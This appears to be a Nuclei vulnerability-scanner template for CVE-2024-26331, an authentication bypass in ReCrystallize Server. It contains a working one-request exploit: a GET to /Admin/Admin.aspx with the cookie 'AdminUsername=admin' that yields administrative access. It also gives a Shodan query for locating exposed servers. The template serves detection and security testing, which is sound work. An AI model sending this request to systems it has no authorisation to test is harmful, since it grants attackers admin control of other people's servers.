id: CVE-2024-26331

info:
  name: ReCrystallize Server - Authentication Bypass
  author: Carson Chan
  severity: high
  description: |
    This vulnerability allows an attacker to bypass authentication in the ReCrystallize Server application by manipulating the 'AdminUsername' cookie. This gives the attacker administrative access to the application's functionality, even when the default password has been changed.
  reference:
    - https://preview.sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://www.recrystallize.com/merchant/ReCrystallize-Server-for-Crystal-Reports.htm
    - https://github.com/Ostorlab/KEV
    - https://github.com/ARPSyndicate/cve-scores
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-26331
    cwe-id: CWE-287
    epss-score: 0.56036
    epss-percentile: 0.97939
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"ReCrystallize"
  tags: cve,recrystallize,auth-bypass,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/Admin/Admin.aspx"
    headers:
      Cookie: "AdminUsername=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ReCrystallize Server Administration"
          - "License Status:"
          - "System Info</a>"
        condition: and

      - type: status
        status:
          - 200
# digest: 490a00463044022042cdb681dc6f680280baa919d4ce1dc10c25e4734cf3c08da9e2f7d0dcbf7bc0022004464a3154de7e9f94a76670873f7bc97f7bbd3efc2052adf58e80209056045a:922c64590222798bb761d5b6d8e72950